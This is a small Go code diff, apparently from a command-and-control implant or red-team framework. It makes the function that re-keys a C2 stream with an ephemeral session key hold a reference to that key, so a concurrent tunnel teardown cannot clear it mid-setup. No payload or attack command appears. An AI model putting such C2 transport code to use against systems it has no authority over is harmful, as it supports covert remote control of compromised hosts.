@@ -72,9 +72,14 @@ func EstablishC2Connection(url, streamID string, capabilities ...string) (conn i
 	// routes: they run BEFORE (and negotiate) the PFS handshake, so they must
 	// stay on the PSK until the tunnel handshake completes inside MsgTunneler.
 	if !isBootstrapRoute(caps) {
-		if sessionKey := getCurrentSessionKey(); len(sessionKey) > 0 {
+		// Acquire a reference so a concurrent message-tunnel teardown (which
+		// clears the current key for reconnect/check-in) cannot yank the key
+		// out mid-setup: the relay must use the SAME key the C2 re-keys this
+		// stream with, or the first data frame fails to decrypt.
+		if sessionKey := acquireSessionKey(); len(sessionKey) > 0 {
 			secureConn.SetKey(sessionKey)
 			logging.Debugf("EstablishC2Connection: re-keyed %v stream to ephemeral PFS session key", caps)
+			releaseSessionKey()
 		}
 	}
 
